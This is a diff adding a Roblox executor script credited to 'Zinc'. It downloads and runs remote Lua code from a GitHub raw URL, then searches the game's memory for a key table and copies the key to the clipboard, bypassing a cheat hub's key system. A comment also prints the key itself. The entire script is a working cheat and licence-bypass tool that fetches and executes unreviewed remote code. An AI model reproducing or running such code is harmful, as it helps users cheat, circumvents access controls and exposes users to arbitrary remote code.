@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LaeraLuzy/SyctheHubV2/main/script.lua",true))()wait(1)for a,a in next,getgc(true)do if type(a)=="table"and rawget(a,"Key")then setclipboard(a.Key)end end;game.StarterGui:SetCore("SendNotification",{Title="Bypasser";Text="Copied key to clipboard";Duration=3.5})game.StarterGui:SetCore("SendNotification",{Title="Bypasser";Text="Please do not use this GUI, it's skidded and horrible";Duration=3.5})
+--KEY IS vcx_ASDNSkasdMsd231+=/
+--THIS IS BYPASSED BY Zinc
